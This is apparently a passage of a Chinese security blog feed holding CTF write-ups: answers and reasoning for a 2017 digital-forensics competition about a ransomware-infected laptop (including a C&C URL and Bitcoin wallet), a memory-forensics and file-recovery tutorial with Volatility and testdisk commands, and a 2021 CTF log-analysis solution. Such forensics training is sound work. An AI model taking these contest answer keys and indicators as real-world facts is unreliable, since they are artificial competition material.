id="33计算机系统时区">33：计算机系统时区</span></h4><table><thead><tr><th>33</th><th>Gary的计算机系统时区是什么？?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>中国标准时间</strong></td></tr><tr><td>B.</td><td>日本标准时间</td></tr><tr><td>C.</td><td>泰国标准时间</td></tr><tr><td>D.</td><td>新加坡标准时间</td></tr><tr><td>E.</td><td>伦敦标准时间</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="33-1.png" alt="33-1"></p><h4><span id="34简单信息分析">34：简单信息分析</span></h4><table><thead><tr><th>34</th><th>在上述加密磁区内，存有一个名为”2017-10-27”的文件夹，内有三张枪械的图片，该三张图片是来自哪个网站?</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="http://gunsdtk58tolcrre.onion">http://gunsdtk58tolcrre.onion<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>B.</strong></td><td><strong><a class="link" href="http://gunsjmzh2btr7lpy.onion">http://gunsjmzh2btr7lpy.onion<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>C.</td><td><a class="link" href="http://thegunstorelasvegas.com">thegunstorelasvegas.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>D.</td><td><a class="link" href="http://cabelas.com">cabelas.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>E.</td><td><a class="link" href="http://hyattgunstore.com">hyattgunstore.com<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><p>实时搜索【2017-10-27】</p><p>发现用户痕迹中，最近访问的文档</p><p><img lazyload src="/images/loading.svg" data-src="34-1.png" alt="34-1"></p><p>路径对上了</p><p>E:\2017-10-27\Screenshot 1.png</p><p>锁定该图片</p><p>想起之前接触的同名文件出现在邮件附件中</p><p><img lazyload src="/images/loading.svg" data-src="34-2.png" alt="34-2"></p><p>参考28题</p><h4><span id="35简单信息分析">35：简单信息分析</span></h4><table><thead><tr><th>35</th><th>Gary的笔记本电脑曾经下载过多少张有关恐怖组织的图片?</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td><strong>B.</strong></td><td><strong>2</strong></td></tr><tr><td>C.</td><td>3</td></tr><tr><td>D.</td><td>4</td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p>根据经验常识，笔记本电脑的下载路径默认在<strong>C:\Users\用户名\Downloads</strong></p><p>考虑到常用用户Gary</p><p>找到该文件夹</p><p>个人认为这道题极易出错，按照官方答案选择B，存在isis.jpg和isis2.jpg</p><p><img lazyload src="/images/loading.svg" data-src="35-1.png" alt="35-1"></p><p>但通过浏览发现其他两张图片，颇具恐怖组织色彩</p><p><img lazyload src="/images/loading.svg" data-src="35-2.png" alt="35-2"></p><p>不解</p><h4><span id="36同19题">36：同19题</span></h4><table><thead><tr><th>36</th><th>根据Gary与Eric邮件的内容，Eric曾经提供Gary一个私有云盘，下列哪项是该邮件提供的资料?</th></tr></thead><tbody><tr><td>A.</td><td>动物图</td></tr><tr><td><strong>B.</strong></td><td><strong>枪的结构图</strong></td></tr><tr><td>C.</td><td>博彩图</td></tr><tr><td>D.</td><td>博彩文件</td></tr><tr><td>E.</td><td>恐怖主义图</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="36-1.png" alt="36-1"></p><h4><span id="37同19题">37：同19题</span></h4><table><thead><tr><th>37</th><th>下列哪项是上述私有云盘的网址?</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="http://mantech.mooo.cn">http://mantech.mooo.cn<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>B.</strong></td><td><strong><a class="link" href="http://mantech.mooo.com">http://mantech.mooo.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>C.</td><td><a class="link" href="http://mooo.com">http://mooo.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>D.</td><td><a class="link" href="http://mantech.com">http://mantech.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>E.</td><td><a class="link" href="http://23.54.45.113">http://23.54.45.113<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><h4><span id="38同19题">38：同19题</span></h4><table><thead><tr><th>38</th><th>下列哪项是上述私有云盘网址的连接端口?</th></tr></thead><tbody><tr><td>A.</td><td>TCP 80</td></tr><tr><td>B.</td><td>TCP 8080</td></tr><tr><td>C.</td><td>UDP 80</td></tr><tr><td><strong>D.</strong></td><td><strong>TCP 8000</strong></td></tr><tr><td>E.</td><td>TCP 443</td></tr></tbody></table><h4><span id="39查看上网痕迹">39：查看上网痕迹</span></h4><table><thead><tr><th>39</th><th>下列哪项是Gary第一次浏览该私有云盘网址时，所使用的浏览器?</th></tr></thead><tbody><tr><td>A.</td><td>Microsoft  Explorer</td></tr><tr><td>B.</td><td>Google  Chrome</td></tr><tr><td><strong>C.</strong></td><td><strong>Mozilla  Firefox</strong></td></tr><tr><td>D.</td><td>Opera</td></tr><tr><td>E.</td><td>QQ 浏览器</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="39-1.png" alt="39-1"></p><p>通过搜索云盘地址得到</p><h4><span id="40同39题">40：同39题</span></h4><table><thead><tr><th>40</th><th>下列哪项是Gary第一次浏览该私有云盘网址的日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-29  12:42:09</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-30  12:42:09</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:42:09</td></tr><tr><td>D.</td><td>2017-10-30  10:42:09</td></tr><tr><td>E.</td><td>2017-10-30  11:42:09</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="40-1.png" alt="40-1"></p><p>最接近的为B选项</p><h4><span id="41查看下载方式">41：查看下载方式</span></h4><table><thead><tr><th>41</th><th>在上述加密磁区内，存有一个名为”2017-10-30”的文件夹，里面有三张与枪械结构有关的图片，该三张图片是从哪个方法/软件下载?</th></tr></thead><tbody><tr><td>A.</td><td>邮件</td></tr><tr><td><strong>B.</strong></td><td><strong>Firefox</strong></td></tr><tr><td>C.</td><td>Chrome</td></tr><tr><td>D.</td><td>USB thumb  drive</td></tr><tr><td>E.</td><td>ftp</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="41-1.png" alt="41-1"></p><h4><span id="42查看下载时间">42：查看下载时间</span></h4><table><thead><tr><th>42</th><th>Gary的笔记本电脑，曾经下载过一个感染了电脑病毒的文件，名为invoice.zip。该病毒程序文件是什么时候下载?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:20</td></tr><tr><td>B.</td><td>2017-10-31  12:50:34</td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-31  12:18:54</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="42-1.png" alt="42-1"></p><h4><span id="43最后存取日期时间">43：最后存取日期/时间</span></h4><table><thead><tr><th>43</th><th>Gary的笔记本电脑，还存有一个感染了电脑病毒的程序文件，名为\User\Gary\Downloads\invoice\dist\invoice.exe。该文件的<u>最后存取日期/时间(Last Accessed Data/Time)</u> 是什么?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>2017-10-31  12:26:27</strong></td></tr><tr><td>B.</td><td>2017-10-31  12:50:34</td></tr><tr><td>C.</td><td>2017-10-31 12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><p>这道题拐弯的点在于</p><p>通过实时搜索得到两条关于【invoice.exe】的记录</p><p>但题干其实把范围只限定在了Downloads里的那一个</p><p>关于他的最后存取时间为A</p><p><img lazyload src="/images/loading.svg" data-src="43-1.png" alt="43-1"></p><h4><span id="44文件伪装">44：文件伪装</span></h4><table><thead><tr><th>44</th><th>上述的invoice.exe文件伪装成什么格式的软件?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>pdf</strong></td></tr><tr><td>B.</td><td>jpg</td></tr><tr><td>C.</td><td>psd</td></tr><tr><td>D.</td><td>Docx</td></tr><tr><td>E.</td><td>Doc</td></tr></tbody></table><p>同样是上一题的环境，导出后依然是exe，看不出什么</p><p>丢进32位系统，得到</p><p><img lazyload src="/images/loading.svg" data-src="44-1.png" alt="44-1"></p><p>选择选项A</p><p><img lazyload src="/images/loading.svg" data-src="44-2.png" alt="44-2"></p><h4><span id="45最后执行日期时间">45：最后执行日期/时间</span></h4><table><thead><tr><th>45</th><th>上述的\User\Gary\Downloads\invoice\dist\invoice.exe文件，<u>最后执行日期/时间(Last Accessed Data/Time)</u> 是什么?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:27</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-31  12:50:34</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><h4><span id="46加密文件类型">46：加密文件类型?</span></h4><table><thead><tr><th>46</th><th>事实上，Gary的笔记本电脑被电脑病毒感染了，部份文件被加密，当中包括下列哪种文件类型?</th></tr></thead><tbody><tr><td>a.</td><td>exe</td></tr><tr><td>b.</td><td>gif</td></tr><tr><td>c.</td><td>jpg</td></tr><tr><td>d.</td><td>psd</td></tr><tr><td>e.</td><td>Docx</td></tr><tr><td>f.</td><td>Doc</td></tr><tr><td></td><td></td></tr><tr><td>A.</td><td>只有(a)  &amp; (b)</td></tr><tr><td>B.</td><td>(a), (b), (d) &amp; (f)</td></tr><tr><td>C.</td><td>(b), ©, (d) &amp; (f)</td></tr><tr><td>D.</td><td>(b),  ©, (e) &amp; (f)</td></tr><tr><td>E.</td><td>以上皆是</td></tr></tbody></table><h4><span id="47执行次数">47：执行次数</span></h4><table><thead><tr><th>47</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件共执行多少?</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td>C.</td><td>3</td></tr><tr><td>D.</td><td>4</td></tr><tr><td><strong>E.</strong></td><td><strong>5</strong></td></tr></tbody></table><p>实时搜索-》用户痕迹-》最近访问记录-》最近程序访问记录</p><p><img lazyload src="/images/loading.svg" data-src="47-1.png" alt="47-1"></p><h4><span id="48查看由什么程序编写">48：查看由什么程序编写</span></h4><table><thead><tr><th>48</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件是由什么程序编写?</th></tr></thead><tbody><tr><td>A.</td><td>LISP</td></tr><tr><td>B.</td><td>C++</td></tr><tr><td>C.</td><td>Visual Basic</td></tr><tr><td><strong>D.</strong></td><td><strong>Python</strong></td></tr><tr><td>E.</td><td>Java</td></tr></tbody></table><p>在查找【invoice.exe】无果后</p><p>exe本质上是压缩包</p><p>关键词查找【invoice】，发现invoice.zip</p><p><img lazyload src="/images/loading.svg" data-src="48-1.png" alt="48-1"></p><p>导出后查看</p><p><img lazyload src="/images/loading.svg" data-src="48-2.png" alt="48-2"></p><h4><span id="49查找调用的动态连结函式库">49：查找调用的动态连结函式库</span></h4><table><thead><tr><th>49</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件，执行时会呼叫下列哪个动态连结函式库(Dynamic Linked Library)</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>KERNEL32.DLL</strong></td></tr><tr><td>B.</td><td>USER32.DLL</td></tr><tr><td>C.</td><td>SHELL32.DLL</td></tr><tr><td>D.</td><td>NTDLL.DLL</td></tr><tr><td>E.</td><td>SYSTEM32.DLL</td></tr></tbody></table><p>询问了队里的RE大手子，得到一个工具CFF Explorer VIII</p><p>打开对应的文件夹，查看导入目录</p><p><img lazyload src="/images/loading.svg" data-src="49-1.png" alt="49-1"></p><p>选择选项A</p><p>但大手子强调，如果这道题是多选题的话，多半还需要加上D选项，因为ntdll模块主要是处理异常和查询一些进程重要信息，模块出现异常时调用几乎是必然。</p><h4><span id="50同43题">50：同43题</span></h4><table><thead><tr><th>50</th><th>Gary的笔记本电脑，还存有另一感染了电脑病毒的程序文件，名为\tmp\invoice.exe。该文件的最后存取日期/时间(Last Accessed Data/Time) 是什么?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:27</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-31  12:50:34</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><h4><span id="51文件之间的关系">51：文件之间的关系</span></h4><table><thead><tr><th>51</th><th>上述两个文件\User\Gary\Downloads\invoice\dist\invoice.exe和 \tmp\invoice.exe是什么关系?</th></tr></thead><tbody><tr><td>A.</td><td>前者是后者的复本</td></tr><tr><td><strong>B.</strong></td><td><strong>后者是前者的复本</strong></td></tr><tr><td>C.</td><td>两者MD5不相同</td></tr><tr><td>D.</td><td>两者元数据(Metadata)相同</td></tr><tr><td>E.</td><td>两者无关系</td></tr></tbody></table><h4><span id="52查看上网痕迹">52：查看上网痕迹</span></h4><table><thead><tr><th>52</th><th>根据勒索讯息的显示，勒索网址是什么？</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="http://223.17.250.208:6000/C&amp;C/">http://223.17.250.208:6000/C&amp;C/<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>B.</td><td><a class="link" href="http://223.17.250.208/C&amp;C/">http://223.17.250.208/C&amp;C/<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>C.</strong></td><td><strong><a class="link" href="http://223.17.250.208:6060/C&amp;C/">http://223.17.250.208:6060/C&amp;C/<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>D.</td><td><a class="link" href="http://223.17.250.208:80/C&amp;C/">http://223.17.250.208:80/C&amp;C/<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>E.</td><td><a class="link" href="http://223.17.250.208:8080/C&amp;C/">http://223.17.250.208:8080/C&amp;C/<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><p>通过实时搜索，除了C选项，其他都没有相关结果</p><h4><span id="53复杂信息分析">53：复杂信息分析</span></h4><table><thead><tr><th>53</th><th>根据勒索讯息的显示，勒索金额是多少钱？</th></tr></thead><tbody><tr><td>A.</td><td>$1,000</td></tr><tr><td><strong>B.</strong></td><td><strong>$10,000</strong></td></tr><tr><td>C.</td><td>$20,000</td></tr><tr><td>D.</td><td>$50,000</td></tr><tr><td>E.</td><td>$100,000</td></tr></tbody></table><p>上题的勒索网站打开失败，</p><p>应该是网站无人维护的问题。</p><p>一通搜索，在主用户的桌面</p><p>C:\Users\Gary\Desktop</p><p>发现screen.png</p><p><img lazyload src="/images/loading.svg" data-src="53-1.png" alt="53-1"></p><h4><span id="54复杂信息分析">54：复杂信息分析</span></h4><table><thead><tr><th>54</th><th>根据勒索讯息的显示，下列哪个是与勒索案件有关的比特币钱包？</th></tr></thead><tbody><tr><td>A.</td><td>1KcjhpkowGWh5QYgPx5hYGuzbZpewgBszh</td></tr><tr><td><strong>B.</strong></td><td><strong>1KcjhpknwGWh5QYgPx5hYGuzbZpewgBszh</strong></td></tr><tr><td>C.</td><td>1KcjhpknwGWh5QYgPx5hYGuzbZpewgBzzh</td></tr><tr><td>D.</td><td>1KcjhpknwGWh5QYgPx6hYGuzbZpewgBszh</td></tr><tr><td>E.</td><td>1KcjhpknwGWh6QYgPx5hYGuzbZpewgBszh</td></tr></tbody></table><h4><span id="55复杂信息分析">55：复杂信息分析</span></h4><table><thead><tr><th>55</th><th>执法机关曾在现场对Gary的电脑进行电子法证检验，期间曾撷取与勒索软件相关的屏幕影像，并储存为png格式。下列哪项是其储存位置?</th></tr></thead><tbody><tr><td>A.</td><td>\Users\彼得\Downloads\</td></tr><tr><td>B.</td><td>\Users\彼得\Desktop\</td></tr><tr><td>C.</td><td>\Users\Gary\Downloads\</td></tr><tr><td><strong>D.</strong></td><td><strong>\Users\Gary\Desktop</strong></td></tr><tr><td>E.</td><td>\Users\Gary\Documents</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2017年第三届美亚杯电子取证-个人赛&quot;&gt;2017年第三届美亚杯电子取证-个人赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;案件背景&quot;&gt;案件背景&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Gary是一位经常用手提电脑的</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>内存取证和文件恢复常见操作</title>
    <link href="http://mklkx.github.io/2021/04/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%92%8C%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/"/>
    <id>http://mklkx.github.io/2021/04/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%92%8C%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/</id>
    <published>2021-04-05T12:48:45.000Z</published>
    <updated>2021-05-04T11:39:47.062Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="内存取证和文件恢复常见操作">内存取证和文件恢复常见操作</span></h1><hr><h2><span id="常用工具">常用工具</span></h2><ul><li>Volatility</li><li>Elcomsoft Forensic Disk Decryptor</li><li>EasyRecovery</li><li>MedAnalyze</li><li>FTK</li></ul><h2><span id="内存">内存</span></h2><ul><li>分析进程、内存数据</li><li>提取分析指定进程的特定内存数据</li></ul><h2><span id="vmdk">VMDK</span></h2><ul><li>本质上是物理硬盘的虚拟版，也会存在跟物理硬盘的分区和扇区类似的填充区域，可以利用这些填充区域把我们需要隐藏的数据进行处理，从而避免文件增加VMDK文件的大小，也可避免由于VMDK文件大小的改变所带来的可能导致虚拟机错误的问题。</li></ul><h2><span id="磁盘">磁盘</span></h2><p>常见的磁盘分区格式：</p><ul><li>Windows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS</li><li>Linux:EXT2-&gt;EXT3-&gt;EXT4</li></ul><h2><span id="以hdctf2019你能发现什么蛛丝马迹吗展开">以【[HDCTF2019]你能发现什么蛛丝马迹吗】展开</span></h2><h3><span id="查看系统版本">查看系统版本</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img imageinfo</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image1.png" alt="image1"></p><p>查看进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP0x86 pslist</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image2.png" alt="image2"></p><p>针对Win2003SP0x86产生报错，故排除这个镜像</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP1x86 pslist</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image3.png" alt="image3"></p><p>根据时间可以发现DumpIt.exe有东西</p><p>与该命令相似的为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 pstree</span><br></pre></td></tr></table></figure><p>不同点在于pstree顾名思义显示的是进程树，表明了各进程之间的从属关系。</p><p><img lazyload src="/images/loading.svg" data-src="image4.png" alt="image4"></p><p>而</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 psscan</span><br></pre></td></tr></table></figure><p>则更加全面地进行了扫描，从而显示出被隐藏的进程，如病毒等</p><p><img lazyload src="/images/loading.svg" data-src="image5.png" alt="image5"></p><h3><span id="将内存中的某个进程数据以-dmp-的格式保存出来">将内存中的某个进程数据以 dmp 的格式保存出来</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 memdump -p 1992 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><h2><span id="以vampn2020-公开赛内存取证展开">以【[V&amp;N2020 公开赛]内存取证】展开</span></h2><p>通过上述内存取证起手式得到系统版本</p><p>查看进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 pslist</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image6.png" alt="image6"></p><p>关注</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TrueCrypt.exe 3364</span><br><span class="line">notepad.exe 3552</span><br><span class="line">mspaint.exe 2648</span><br><span class="line"></span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3364 --dump-dir&#x3D;.&#x2F;</span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3552 --dump-dir&#x3D;.&#x2F;</span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 2648 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>依次处理</p><h3><span id="1notepadgteditbox">1）notepad=&gt;editbox</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 editbox</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image7.png" alt="image7"></p><h3><span id="2mspaintgtgimp">2）mspaint=&gt;Gimp</span></h3><p><a class="link" href="https://www.gimp.org/downloads/">https://www.gimp.org/downloads/<i class="fas fa-external-link-alt"></i></a></p><p>不断调节位移、宽度和高度，</p><p><img lazyload src="/images/loading.svg" data-src="image8.png" alt="image8"></p><p>出现【1YxFCQ6goYBF6Q】</p><h3><span id="3truecryptgtelcomsoft-forensic-disk-decryptor">3）TrueCrypt=&gt;Elcomsoft Forensic Disk Decryptor</span></h3><p>Decrypt or mount disk-&gt;TrueCrypt-&gt;select&amp;Memory dump&amp;Browse-&gt;mount</p><p><img lazyload src="/images/loading.svg" data-src="image9.png" alt="image9"></p><p><img lazyload src="/images/loading.svg" data-src="image10.png" alt="image10"></p><p>发现多了个F盘，其中存在key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uOjFdKu1jsbWI8N51jsbWI8N5</span><br></pre></td></tr></table></figure><p>得到VOL的时候就该想到需要挂载，使用VeraCrypt,按之前学到的用法</p><p>此处注意需要勾选TrueCrypt</p><p><img lazyload src="/images/loading.svg" data-src="image11.png" alt="image11"></p><p>得到fffflag.zip</p><h2><span id="以xman2018排位赛file展开">以【[XMAN2018排位赛]file】展开</span></h2><h3><span id="extundelete恢复原理">extundelete恢复原理：</span></h3><p>在linux下可以通过“ls -id”来查看某个文件或者目录的inode值，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;桌面# ls -id &#x2F; </span><br><span class="line">2 &#x2F;</span><br></pre></td></tr></table></figure><p>从而得到桌面的innode值为2</p><p>而当使用extundelete来恢复文件时并不依赖特定的文件格式，</p><p>首先extundelete会通过文件的inode信息来获得当前文件系统下所有文件的信息，包括文件名和inode，包括已存在的和删除的文件。</p><p>再通过inode信息结合日志去查询该inode所在的block位置，包括直接块、间接块等信息。</p><p>最后利用dd命令将这些信息备份出来，从而恢复数据文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete attachment.img --restore-all</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image12.png" alt="image12"></p><h2><span id="以bsidessf2019diskimage展开">以【[BSidesSF2019]diskimage】展开</span></h2><p>前期通过zsteg分离出png中的数据后，利用testdisk进行分析。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">testdisk disk.dat</span><br></pre></td></tr></table></figure><p>一路回车</p><p><img lazyload src="/images/loading.svg" data-src="image13.png" alt="image13"></p><p><img lazyload src="/images/loading.svg" data-src="image14.png" alt="image14"></p><p><img lazyload src="/images/loading.svg" data-src="image15.png" alt="image15"></p><p>选择最不同的那一个，根据提示进行copy，得到flag</p><p>关于testdisk的(中文版官方指南)[<a class="link" href="https://www.cgsecurity.org/wiki/Testdisk_%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97#.E9.97.AE.E9.A2.98.E4.B8.BE.E4.BE.8B">https://www.cgsecurity.org/wiki/Testdisk_操作指南#.E9.97.AE.E9.A2.98.E4.B8.BE.E4.BE.8B<i class="fas fa-external-link-alt"></i></a>]有更加深入的功能解说和详细用法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;内存取证和文件恢复常见操作&quot;&gt;内存取证和文件恢复常见操作&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;常用工具&quot;&gt;常用工具&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Volatility&lt;/li&gt;
&lt;li&gt;Elcomsoft Fore</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>虎符</title>
    <link href="http://mklkx.github.io/2021/04/03/%E8%99%8E%E7%AC%A6/"/>
    <id>http://mklkx.github.io/2021/04/03/%E8%99%8E%E7%AC%A6/</id>
    <published>2021-04-03T07:50:01.000Z</published>
    <updated>2021-05-08T10:36:21.558Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021数字中国创新大赛虎符网络安全赛道">2021数字中国创新大赛虎符网络安全赛道</span></h3><hr><h4><span id="你会日志分析吗">你会日志分析吗</span></h4><blockquote><p>线索只有一份access.log，你能从中分析到什么？</p></blockquote><p>观察到线索为盲注内容，</p><p>通过观察注入语句遍历库和表的过程，发现不同之处在于针对不同字符编码，返回的长度不同</p><p><img lazyload src="/images/loading.svg" data-src="misc1.bmp" alt="misc1"></p><p>通过拼接得到</p><p><code>web1flllag,userflag ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0eQ== #flag&#123;You_are_so_greaty</code></p><p>提交flag：</p><p><strong>flag{You_are_so_great}</strong></p><h4><span id="cubic">cubic</span></h4><blockquote><p>Please give me 6 pairs of positive integers (x,y,z) satisfying the equation x/(y+z) + y/(z+x) + z/(x+y) = 6 nc 8.140.152.226 27359</p></blockquote><p>根据https://mlzeng.com/an-interesting-equation.html理解算法意思。对等式进行化简后更改脚本，从而得到几组基底</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from fractions import Fraction as Frac</span><br><span class="line">from math import gcd</span><br><span class="line">#n &#x3D; 500</span><br><span class="line">for x in range(-100,100):</span><br><span class="line">    for y in range(-100,100):</span><br><span class="line">        for z in range(-100,100):</span><br><span class="line">            if gcd(x, gcd(y, z)) &#x3D;&#x3D; 1:</span><br><span class="line">                if x**3 + y**3 + z**3 - 5 * x**2 * (y + z) - 5 * y**2 * (z + x) - 5 * z**2 * (x + y) - 9 * x * y * z &#x3D;&#x3D; 0:</span><br><span class="line">                    print((x, y, z))</span><br><span class="line">#(-23, -7, 3)(-8, -7, 5)(-7, -23, 3)(-7, -8, 5)(-5, 7, 8)(-5, 8, 7)(-3, 7, 23)(-3, 23, 7)(-1, -1, 1)(-1, 0, 1)(-1, 1, 0)(-1, 1, 1)(0, -1, 1)(1, -1, 0)(1, -1, 1)(7, -5, 8)(7, -3, 23)(8, -5, 7)(23, -3, 7)</span><br></pre></td></tr></table></figure><p>去掉冗余后留下两组分别为(-23, -7, 3)(-8, -7, 5)找到文章https://www.quora.com/How-do-you-find-the-positive-integer-solutions-to-frac-x-y+z-±frac-y-z+x-±frac-z-x+y-4，根据评论得到解决类似问题x/(y+z) + y/(z+x) + z/(x+y) = 4，的脚本和网站http://magma.maths.usyd.edu.au/calc/针对本题目更改脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; For my colleagues in Shell with a lot of love,  (and  with a lot of time now since no commuting, cause COVID) </span><br><span class="line">&#x2F;&#x2F; Code is commented to explain how to solve the meme  (https:&#x2F;&#x2F;preview.redd.it&#x2F;p92108lekoq11.jpg?width&#x3D;367&amp;format&#x3D;pjpg&amp;auto&#x3D;webp&amp;s&#x3D;e0c84917c3d7e130cad06f9ab5a85634b0c88cfb) </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; x&#x2F;(y+z) + y&#x2F;(x+z) + z&#x2F;(x+y) &#x3D; 4 </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; This is the smallest solution: </span><br><span class="line">&#x2F;&#x2F; x&#x3D;4373612677928697257861252602371390152816537558161613618621437993378423467772036 </span><br><span class="line">&#x2F;&#x2F; y&#x3D;36875131794129999827197811565225474825492979968971970996283137471637224634055579 </span><br><span class="line">&#x2F;&#x2F; z&#x3D;154476802108746166441951315019919837485664325669565431700026634898253202035277999 </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; Paste in the site below to execute this code see this result, also read the comments here to understand.  </span><br><span class="line">&#x2F;&#x2F; The last part of the prints() after executed shows you the solution above. </span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;magma.maths.usyd.edu.au&#x2F;calc&#x2F; 